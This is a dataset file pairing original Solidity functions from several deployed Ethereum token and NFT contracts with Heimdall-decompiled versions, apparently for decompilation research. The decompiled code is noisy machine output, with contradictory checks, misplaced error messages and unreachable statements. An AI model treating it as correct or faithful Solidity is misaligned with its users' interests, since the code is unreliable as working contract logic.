{"contract_address": "0x801d42E06aEf2B3053940d5D9be3557CC3755D4A", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"SafeMath: multiplication overflow\");\n        require(address(arg0), \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(address(owner) == (address(msg.sender)), \"SafeMath: multiplication overflow\");\n        require(!(!(address(owner)) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_d == ((store_d * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_d * arg1) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(store_f) == (address(arg0)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(store_g)) == (address(arg0))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = tx.origin;\n        var_n = 0x04;\n        require(block.number > storage_map_h[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_n = 0x04;\n        storage_map_h[var_a] = block.number;\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_d * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (((store_d * arg1) / 0x64) + storage_map_h[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(((store_d * arg1) / 0x64) + storage_map_h[var_a] < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = ((store_d * arg1) / 0x64) + storage_map_h[var_a];\n        uint256 var_j = (store_d * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_d * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_h = 0x40 + var_h;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_d * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        uint256 var_u = var_h.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((store_d * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_d * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_f) == (address(arg0))) {\n            if (address(store_f) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0675693f486F11520F5b6814e290724cC6937312", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function competitveWhitelistMint(uint256 quantity) public payable nonReentrant {\\r\\n        require(\\r\\n            block.timestamp >= competitveWhitelistInfo.START_TIME &&\\r\\n            block.timestamp <= competitveWhitelistInfo.END_TIME,\\r\\n            \\\"Competitive whitelist minting closed\\\"\\r\\n        );\\r\\n        require(competitveWhitelistInfo.CURR_MINTED < competitveWhitelistInfo.SUPPLY, \\\"Sold Out\\\");\\r\\n        require(COMPETITIVE_WHITELIST_ADDRESSES[msg.sender], \\\"Not on the competitive whitelist\\\");\\r\\n        require(COMPETITIVE_WHITELIST_CLAIMED[msg.sender] > 0, \\\"Claimed all avaliable times\\\");\\r\\n        require(quantity <= competitveWhitelistInfo.LIMIT_PER_ADDRESS, \\\"Exceeded mint limit\\\");\\r\\n        require(msg.value == competitveWhitelistInfo.PRICE * quantity, \\\"Incorrect amount\\\");\\r\\n\\r\\n        _internalMint(msg.sender, quantity);\\r\\n        competitveWhitelistInfo.CURR_MINTED += quantity;\\r\\n        COMPETITIVE_WHITELIST_CLAIMED[msg.sender] -= 1;\\r\\n    }", "heimdall_decompiled_code": "function competitveWhitelistMint(uint256 arg0) public payable {\n        require(!(ownerg == 0x02), \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        ownerg = 0x02;\n        require(block.timestamp < store_g, \"Competitive whitelist minting closed\");\n        require(!(block.timestamp < store_g), \"Competitive whitelist minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x436f6d70657469746976652077686974656c697374206d696e74696e6720636c;\n        var_e = 0x6f73656400000000000000000000000000000000000000000000000000000000;\n        require(getCompetitiveWhitelistNumMinted < competitveWhitelistInfo, \"Exceeded mint limit\");\n        address var_f = msg.sender;\n        var_g = 0x22;\n        require(bytes1(storage_map_ah[var_f]), \"Exceeded mint limit\");\n        var_f = msg.sender;\n        var_g = 0x23;\n        require(storage_map_ah[var_f], \"Exceeded mint limit\");\n        require(!(arg0 > getCompetitiveWhitelistLimit), \"Exceeded mint limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4578636565646564206d696e74206c696d697400000000000000000000000000;\n        require(!(getCompetitiveWhitelistPrice & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / getCompetitiveWhitelistPrice))), \"Incorrect amount\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(msg.value == (getCompetitiveWhitelistPrice * arg0), \"Incorrect amount\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x496e636f727265637420616d6f756e7400000000000000000000000000000000;\n        require(!(bytes1(paused)), \"Minting unavaliable\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4d696e74696e6720756e6176616c6961626c6500000000000000000000000000;\n        require(!(getGuaranteedWhitelistSupply > ~(competitveWhitelistInfo)), \"Claimed all avaliable times\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x436c61696d656420616c6c206176616c6961626c652074696d65730000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4e6f74206f6e2074686520636f6d70657469746976652077686974656c697374;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x08;\n        var_d = 0x536f6c64204f7574000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp > store_h), \"Competitive whitelist minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x436f6d70657469746976652077686974656c697374206d696e74696e6720636c;\n        var_e = 0x6f73656400000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf563f9eCe196488b3E1c4f769437C6978E5bA140", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x68166ad94798eafB675d6Ff4Cd28eE6eAA19bd17", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(address(this) == (address(msg.sender)));\n        require(address(store_a) == (address(msg.sender)));\n        require((0 == ((0 * arg1) / arg1)) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(arg0);\n        var_b = 0;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        store_a = 0x010000000000000000000000000000000000000000 | (uint248(store_a));\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_h = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;\n        require(0x12);\n        require((0x01 == 0x01) | !0x23c34600);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_j = 0x5b8d80;\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_e.length;\n        address var_n = address(this);\n        uint256 var_o = block.timestamp;\n        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).Unresolved_791ac947(var_j); // call\n        (bool success, bytes memory ret0) = address(0x15c0811abfced77e127b58f9040976a6e78ad412).transfer(address(this).balance);\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                require(0x0a);\n                require(0x0a == 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(0x0a == 0x02);\n                require(!0x12 > 0xff);\n                require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x12 > 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            }\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x4a332C2EE399881195E10544033c2378E732e2C2", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_u = var_f.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
